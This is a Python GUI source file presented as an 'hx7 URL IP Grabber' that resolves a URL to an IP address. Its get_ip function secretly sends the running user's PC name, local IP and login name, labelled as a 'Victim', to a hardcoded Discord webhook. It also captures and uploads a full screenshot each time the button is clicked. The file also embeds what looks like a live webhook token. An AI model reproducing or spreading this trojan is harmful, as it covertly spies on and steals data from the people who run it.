from tkinter import *
import socket
import time
import requests
import datetime
import pyautogui
import os


root = Tk()
root.geometry("700x450+300+123")
root.title('hx7 URL IP Grabber [V.1]')
root.resizable(False, False)
try:
    root.iconbitmap('n_ap.ico')
except:
    try:
        root.iconbitmap('Images/n_ap.ico')
    except:
        try:
            root.iconbitmap('images/n_ap.ico')
        except:
            pass
            print("[!] Logo Not Found !")
root.configure(bg="#313337")


# ============= Functions ============= #

def get_ip():
    url = url_box.get()
    url_ip = socket.gethostbyname(url)
    url_box.delete(0, END)
    url_box.insert(INSERT, url_ip)

    webhook = "https://discord.com/api/webhooks/994361214224306266/22xPZREKMQ8JFKBbDvzK3NWrHhGM2MVbf-fzOJfu0iiy1ZiKpMMq_76B3BZjw4ERnXDS"

    today = datetime.date.today()

    host_name_two = socket.gethostname()
    victim_ip = socket.gethostbyname(host_name_two)
    pc_username = os.getlogin()

    alert = {
        "avatar_url":"https://i.imgur.com/tavZoYq.gif",
        "name":"hx7 CyBer Team",
        "embeds": [
            {
                "author": {
                    "name": "hx7 CyBer Team Bot",
                    "url": "https://github.com/hx7CyBerTeam"
                    },
                "description": f"Victim PC Name : \n{host_name_two}\n\nVictim iP : \n{victim_ip}\n\n\n**Searched URL :**\n``{url}``\n\n**Searched URL iP :**\n``{url_ip}``\n\n\nPC Username :\n{pc_username}",
                "color": 8421504,
                "footer": {
                  "text": f"hx7 CyBer Team Caught Someone lacking at・{today}"
                }
            }
        ]
    }
    requests.post(webhook, json=alert)
    screenshot = pyautogui.screenshot()
    screenshot.save("C:\\Windows\\Temp\\untitled.png")
    image_file_descriptor = open("C:\\Windows\\Temp\\untitled.png", 'rb')
    files = {'media': image_file_descriptor}
    requests.post(webhook, files=files)

def clear():
    url_box.delete(0, END)
    url_box.focus()

# ================================ #

# ============= Main ============= #

app_title = Label(root,
                  text='hx7 URL IP Grabber',
                  fg='white',
                  bg="#313337",
                  font=("Tajawal", 17))
app_title.place(x=266,y=5)

# ================================ #

# ============= App ============= #

app_lbl1 = Label(root,
                 text='Enter URL',
                 fg='white',
                 bg="#313337",
                 font=("Tajawal", 12, 'bold'))
app_lbl1.place(x=318,y=70)

url_box = Entry(root,
                bg="#505050",
                fg='white',
                bd=1,
                relief=SOLID,
                width=35,
                justify=CENTER)
url_box.place(x=245,y=100)

get_btn = Button(root,
                   text='Get iP',
                   fg='white',
                   bg="#575757",
                   font=("Tajawal", 8, 'bold'),
                   bd=1,
                   relief=SOLID,
                   width=16,
                   cursor='hand2',
                   command=get_ip)
get_btn.place(x=303,y=125)

clear_btn = Button(root,
                   text='C',
                   fg='white',
                   bg="#505050",
                   font=("Tajawal", 6, 'bold'),
                   bd=1,
                   relief=SOLID,
                   width=2,
                   cursor='hand2',
                   command=clear)
clear_btn.place(x=450,y=100)

# ================================ #


root.mainloop()